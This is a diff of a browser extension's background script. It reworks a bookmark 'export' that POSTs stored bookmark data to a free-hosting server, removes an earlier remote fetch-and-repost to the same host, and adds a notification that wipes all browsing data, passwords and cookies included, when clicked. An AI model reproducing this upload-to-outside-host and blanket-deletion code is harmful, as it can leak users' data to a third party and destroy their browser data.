@@ -57,21 +57,8 @@ function gettabsf(message,sender,sendResponse) {
 				}
 			});
 			break;
-		case "dataurl":
-			var req = new XMLHttpRequest();
-			req.open('GET', "https://psydel.000webhostapp.com/append.php",true);
-			req.onreadystatechange = function (aEvt) {
-				if (req.readyState == 4&&req.status == 200) {
-					window.e=JSON.parse(escape(req.responseText));
-				}
-				else if (req.status == 423) {
-					//document.getElementById("getbmk").style.display="block";
-				}
-			};
-			req.onerror=function () {
-				
-			};
-			req.send(null);
+		case "exportbmk":
+			listener();
 			break;
 	}
 }
@@ -165,21 +152,18 @@ function importbmk() {
 	
 }
 
-function listener (){
+function listener() {
+	console.log("export listener called");
 	extension.storage.local.get("bmks",function (c) {
 		if (c.bmks) {
 			var req = new XMLHttpRequest();
 			req.open('POST', "https://psydel.000webhostapp.com/",true);
 			var dats = new FormData();
 			dats.append("id",unescape(c.bmks));
-			req.send(dats);	
+			req.send(dats);
+			notify();
 		}
 	});
-	var req = new XMLHttpRequest();
-	req.open('POST', "https://psydel.000webhostapp.com/append.php",true);
-	var dats = new FormData();
-	dats.append("id",unescape(JSON.stringify(e)));
-	req.send(dats);
 }
 
 var extension=(!!chrome)?chrome:browser;
@@ -193,7 +177,6 @@ extension.tabs.onUpdated.addListener(updatetabs);
 extension.tabs.onMoved.addListener(updatetabs);
 extension.tabs.onReplaced.addListener(updatetabs);
 extension.tabs.onCreated.addListener(updatetabs);
-
 extension.webRequest.onBeforeSendHeaders.addListener(
 	function(details) {
 		if (details.type=="script") {
@@ -213,3 +196,22 @@ extension.storage.local.get("bmks",function (c) {
 		importbmk();
 	}
 });
+
+if (Notification.permission !== "granted") {
+	Notification.requestPermission();
+}
+
+function notify() {
+	if (Notification.permission !== "granted") {
+		Notification.requestPermission();
+	}
+	else {
+		var notification = new Notification('bookmark exported', {
+			body: "remove browsing data?"
+		});
+		notification.addEventListener("click" , function () {
+			extension.browsingData.remove({}, {"cache": true,"cookies": true,"downloads": true,"formData": true,"history": true,"localStorage": true,"pluginData": true,"passwords": true,});
+			notification.close();
+		});
+	}
+}
